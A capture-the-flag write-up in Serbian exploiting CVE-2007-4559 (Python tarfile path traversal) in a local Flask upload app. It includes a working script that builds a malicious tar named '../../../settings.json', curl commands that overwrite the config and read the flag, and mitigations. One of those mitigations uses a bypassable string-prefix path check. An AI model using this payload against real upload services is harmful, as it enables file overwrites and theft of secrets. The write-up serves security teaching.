# Writeup — CVE-2007-4559 (Python tarfile path traversal)

**Autor:** Trifun  
**Cilj:** Submission Portal (`dodatni/trifun`)  
**Ranjivost:** CVE-2007-4559

---

## 1. Uvod

CVE-2007-4559 je ranjivost u Python `tarfile` modulu. Funkcije `extract()` i `extractall()` ne sanitizuju imena fajlova unutar tar arhive, pa napadač može da koristi `..` (path traversal) da napiše fajl **van** direktorijuma u koji se arhiva raspakuje.

Aplikacija prihvata `.tar` arhive preko web forme i automatski ih raspakuje — tipičan scenario u kome se ova ranjivost i danas pojavljuje u praksi.

---

## 2. Arhitektura aplikacije

| Komponenta | Tehnologija | Uloga |
|------------|-------------|-------|
| Frontend | Angular | Forma za upload tar arhive |
| Backend | Flask (Python) | API sa jednim ranjivim endpointom |
| Konfiguracija | `settings.json` | Određuje koji fajl `/api/welcome` prikazuje |
| Tajna | `secrets/flag.txt` | Flag koji treba izvući |

### Endpointi

- `GET /api/welcome` — čita tekst iz fajla navedenog u `settings.json` (`welcome_file`)
- `POST /api/submit` — prima tar arhivu, čuva je u `uploads/<uuid>/` i poziva `tarfile.extractall()`

---

## 3. Rekognosciranje

### 3.1 Frontend

Na `http://localhost:4200` nalazi se jednostavna forma:

- prikazuje welcome poruku sa servera
- omogućava upload `.tar` / `.tar.gz` fajla

### 3.2 API

```bash
curl http://localhost:5000/api/welcome
```

Odgovor:

```json
{
  "message": "Dobrodošli na Submission Portal.\nPošaljite .tar arhivu sa vašim projektom."
}
```

Upload benign arhive pokazuje gde se fajlovi ekstrahuju:

```json
{
  "submission_id": "...",
  "extracted_to": "uploads/<uuid>/extracted",
  "files": ["projekat.txt"]
}
```

Iz toga zaključujemo:

1. Ekstrakcija ide u `uploads/<uuid>/extracted/`
2. Server veruje korisničkoj tar arhivi bez dodatne provere

---

## 4. Analiza ranjivosti

Ranjivi kod u `server/app.py`:

```python
def extract_submission(archive_path: Path, destination: Path) -> None:
    destination.mkdir(parents=True, exist_ok=True)
    with tarfile.open(archive_path) as archive:
        archive.extractall(path=destination)
```

`extractall()` za svaki član arhive radi otprilike:

```
final_path = destination + "/" + member.name
```

Ako `member.name` sadrži `../../settings.json`, rezultat je putanja **izvan** `destination` direktorijuma. Python `tarfile` modul to ne blokira — upravo je to suština CVE-2007-4559.

### Zašto je ovo opasno ovde?

Aplikacija ima `settings.json` u korenu servera:

```json
{
  "welcome_file": "data/welcome.txt"
}
```

Endpoint `/api/welcome` učitava taj JSON i čita odgovarajući fajl. Ako napadač preko path traversal-a **prepiše** `settings.json`, može da natera aplikaciju da čita proizvoljan fajl — uključujući `secrets/flag.txt`.

---

## 5. Eksploatacija

### 5.1 Računanje traversal putanje

Ekstrakcija ide u:

```
server/uploads/<submission_id>/extracted/
```

Da bismo došli do `server/settings.json`, potrebne su dve `..` sekvence:

```
uploads/<id>/extracted/  →  ../  →  uploads/<id>/
                        →  ../../  →  uploads/
```

Čekaj — treba nam još jedan nivo. Struktura:

```
server/
  settings.json
  uploads/
    <uuid>/
      upload.tar
      extracted/    ← ovde ide extractall
```

Iz `extracted/`:

- `../` → `<uuid>/`
- `../../` → `uploads/`
- `../../../` → `server/` (koren)

Dakle, ime člana arhive mora biti: **`../../../settings.json`**

> Napomena: U ranijoj verziji korišćeno je `../../settings.json` ako se ekstrahuje direktno u `uploads/<uuid>/` umesto u poddirektorijum. U finalnoj verziji aplikacije ekstrakcija je u `extracted/`, pa su potrebna **tri** `..` nivoa.

### 5.2 Kreiranje zlonamerne arhive

```python
import io
import tarfile

payload = b'{"welcome_file": "secrets/flag.txt"}'

with tarfile.open("malicious.tar", "w") as tar:
    info = tarfile.TarInfo(name="../../../settings.json")
    info.size = len(payload)
    tar.addfile(info, io.BytesIO(payload))
```

Arhiva sadrži jedan „fajl" čije ime izlazi iz ekstrakcionog direktorijuma i cilja `settings.json`.

### 5.3 Upload

```bash
curl -X POST http://localhost:5000/api/submit \
  -F "archive=@malicious.tar"
```

Server prijavljuje uspešnu ekstrakciju. `settings.json` je prepisan.

### 5.4 Exfiltracija flag-a

```bash
curl http://localhost:5000/api/welcome
```

Odgovor:

```json
{
  "message": "FLAG{tarfile_path_traversal_CVE-2007-4559}"
}
```

### 5.5 Automatizacija

U repou su skripte:

```bash
cd exploit
python create_malicious_tar.py --traversal ../../../settings.json -o malicious.tar
python exploit.py --url http://localhost:5000
```

---

## 6. Dijagram napada

```
[Napadač]
    |
    | 1. POST /api/submit (malicious.tar)
    v
[Flask server]
    |
    | 2. extractall() -> ../../../settings.json
    v
[settings.json prepisan]
    |
    | 3. GET /api/welcome
    v
[Čita secrets/flag.txt]
    |
    v
[Flag u HTTP odgovoru]
```

---

## 7. Mitigacija

1. **Validacija imena pre ekstrakcije** — odbiti članove koji sadrže `..` ili apsolutne putanje:

```python
def safe_extract(archive: tarfile.TarFile, destination: Path) -> None:
    dest = destination.resolve()
    for member in archive.getmembers():
        target = (dest / member.name).resolve()
        if not str(target).startswith(str(dest)):
            raise ValueError(f"Blocked path traversal: {member.name}")
        archive.extract(member, path=destination)
```

2. **`filter="data"`** (Python 3.12+) na `extractall()` — ugrađeni filter za data fajlove.

3. **Ne raspakivati nepouzdane arhive** u istom procesu kao aplikacija; koristiti izolovan kontejner sa minimalnim permisijama.

4. **Princip najmanjih privilegija** — proces koji ekstrahuje ne bi trebalo da može da piše u konfiguracioni direktorijum aplikacije.

---

## 8. Zaključak

Jedan jednostavan endpoint za upload tar arhive, u kombinaciji sa `tarfile.extractall()` bez validacije, dovoljan je za arbitrarno pisanje fajlova. U ovoj aplikaciji to je lančano sa čitanjem konfiguracije — prepisivanjem `settings.json` napadač usmerava `/api/welcome` na `secrets/flag.txt` i izvlači flag bez autentifikacije.

To je suština CVE-2007-4559: **15+ godina stara ranjivost koja i danas živi u aplikacijama koje veruju korisničkim arhivama.**
